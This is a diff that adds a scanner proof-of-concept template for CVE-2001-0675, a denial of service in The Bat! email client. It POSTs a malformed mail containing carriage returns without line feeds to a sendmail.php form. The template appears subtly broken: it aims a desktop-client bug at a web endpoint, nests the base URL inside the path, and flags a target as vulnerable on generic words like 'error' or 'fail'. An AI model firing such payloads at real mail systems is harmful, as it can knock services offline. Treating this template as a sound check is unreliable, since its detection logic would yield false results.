@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "利用畸形的邮件数据，发送仅包含 carriage return (CR) 但缺少 line feed (LF) 的邮件来触发 Rit Research Labs The Bat! 1.51 for Windows 电子邮件客户端的拒绝服务漏洞。此种特殊字符组合导致软件崩溃或无法正常处理邮件。"
+id = "POC-AVE-2001-0287"
+name = "Rit Research Labs The Bat! 1.x Missing Linefeeds Denial of Service PoC"
+severity = "medium"
+tags = ["ave-2001-0287"]
+vuln_id = [
+    "CVE-2001-0675",
+    "AVE-2001-0287",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/sendmail.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "--boundary\rTo: test@victim.com\rSubject: Test\r\r\r"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "fail",
+    "crash",
+    "vulnerable",
+    "The Bat!",
+]
